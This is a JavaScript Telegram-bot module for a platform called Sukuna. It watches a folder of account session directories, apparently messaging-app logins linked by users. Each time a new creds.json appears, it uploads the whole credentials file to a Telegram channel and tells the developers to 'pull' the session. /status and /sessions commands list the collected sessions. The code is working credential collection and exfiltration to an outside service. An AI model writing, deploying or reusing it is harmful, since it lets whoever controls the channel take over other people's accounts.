/**
 * ═══════════════════════════════════════════════════════
 * 📡 TELEGRAM SESSION MONITOR | مراقب الجلسات
 * ═══════════════════════════════════════════════════════
 * 👑 المطور: آدم (شادو) | Adam (Shadow)
 * 🤖 البوت: سوكونا | Sukuna
 * 📜 الوصف: مراقبة فولدر الجلسات الجديدة وإرسالها لقناة التليجرام
 * ═══════════════════════════════════════════════════════
 */

import { Telegraf } from 'telegraf'
import fs from 'fs'
import path from 'path'
import config from './config.js'

let bot = null
const processedSessions = new Set()

// ═══ إرسال إشعار بجلسة جديدة ═══
export async function notifyNewSession(botNumber, sessionPath) {
  if (!bot || !config.telegram.token) {
    console.log('⚠️ Telegram bot not configured')
    return
  }

  try {
    const credsPath = path.join(sessionPath, 'creds.json')
    if (!fs.existsSync(credsPath)) return

    const sessionSize = fs.readdirSync(sessionPath).length

    const message = [
      '🕸 *جلسة بوت جديدة جاهزة!*',
      '',
      '⊱⊹•─๋︩︪═╾═─•┈⧽┊🎭┊⧼┈•─═╼═─๋︩︪•⊹⊰',
      '',
      `📱 *رقم البوت:* \`${botNumber}\``,
      `📂 *عدد الملفات:* ${sessionSize}`,
      `🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}`,
      '',
      '⋄⊹•─๋︩︪╾─•┈ ⧼ ⇊ ⧽ ┈•─╼─๋︩︪•⊹',
      '',
      '> الجلسة اتحفظت في:',
      `\`${sessionPath}\``,
      '',
      '📥 استخدم الأمر في بوت سوكونا الرئيسي لسحب الجلسة.'
    ].join('\n')

    // ═══ إرسال الرسالة للقناة/الجروب ═══
    if (config.telegram.sessionsChannel) {
      try {
        await bot.telegram.sendMessage(config.telegram.sessionsChannel, message, {
          parse_mode: 'Markdown'
        })

        // ═══ إرسال ملف creds.json نفسه ═══
        const credsBuffer = fs.readFileSync(credsPath)
        await bot.telegram.sendDocument(
          config.telegram.sessionsChannel,
          { source: credsBuffer },
          {
            caption: `📦 جلسة البوت: ${botNumber}`,
            filename: `creds_${botNumber}.json`
          }
        )

        console.log(`📡 Session notification sent to Telegram: ${botNumber}`)
      } catch (e) {
        console.error('❌ Error sending to channel:', e.message)
      }
    }

    // ═══ إرسال إشعار للمطورين ═══
    for (const ownerId of config.telegram.owners) {
      try {
        await bot.telegram.sendMessage(ownerId, `✅ جلسة جديدة جاهزة: ${botNumber}`)
      } catch {}
    }

  } catch (e) {
    console.error('❌ Error sending session notification:', e.message)
  }
}

// ═══ مراقبة الفولدر ═══
function startWatching() {
  const subDir = config.subSessionsDir

  if (!fs.existsSync(subDir)) {
    fs.mkdirSync(subDir, { recursive: true })
  }

  console.log(`👁️ Watching for new sessions in: ${subDir}`)

  // ═══ فحص دوري ═══
  setInterval(async () => {
    try {
      const sessions = fs.readdirSync(subDir)

      for (const session of sessions) {
        const sessionPath = path.join(subDir, session)
        const credsPath = path.join(sessionPath, 'creds.json')

        if (fs.existsSync(credsPath) && !processedSessions.has(session)) {
          processedSessions.add(session)
          console.log(`🆕 New session detected: ${session}`)
          await notifyNewSession(session, sessionPath)
        }
      }
    } catch (e) {
      console.error('Error watching sessions:', e.message)
    }
  }, config.telegram.checkInterval)
}

// ═══ تشغيل البوت ═══
export async function startTelegramMonitor() {
  if (!config.telegram.token) {
    console.log('⚠️ Telegram token not configured. Session monitor disabled.')
    return
  }

  try {
    bot = new Telegraf(config.telegram.token)
    globalThis.sessionMonitorBot = bot

    // ═══ أمر /status ═══
    bot.command('status', async (ctx) => {
      const subDir = config.subSessionsDir
      let sessionCount = 0

      try {
        sessionCount = fs.readdirSync(subDir).filter(s => {
          return fs.existsSync(path.join(subDir, s, 'creds.json'))
        }).length
      } catch {}

      await ctx.reply([
        '🕸 *حالة منصة سوكونا*',
        '',
        `📂 عدد الجلسات: ${sessionCount}`,
        `📡 المراقبة: شغالة ✅`,
        `⏱️ آخر فحص: ${new Date().toLocaleTimeString('ar-SA')}`
      ].join('\n'), { parse_mode: 'Markdown' })
    })

    // ═══ أمر /sessions ═══
    bot.command('sessions', async (ctx) => {
      const subDir = config.subSessionsDir
      let sessions = []

      try {
        sessions = fs.readdirSync(subDir).filter(s => {
          return fs.existsSync(path.join(subDir, s, 'creds.json'))
        })
      } catch {}

      if (!sessions.length) {
        return ctx.reply('📭 مفيش جلسات حالياً.')
      }

      const list = sessions.map((s, i) => `${i + 1}. 📱 ${s}`).join('\n')
      await ctx.reply([
        '🕸 *الجلسات المتاحة:*',
        '',
        list,
        '',
        `📊 الإجمالي: ${sessions.length}`
      ].join('\n'), { parse_mode: 'Markdown' })
    })

    bot.launch()
      .then(() => {
        console.log('📡 Telegram session monitor is running!')
      })
      .catch(err => {
        console.error('❌ Telegram monitor error:', err.message)
      })

    startWatching()

  } catch (e) {
    console.error('❌ Failed to start Telegram monitor:', e.message)
  }
}

export default { startTelegramMonitor, notifyNewSession }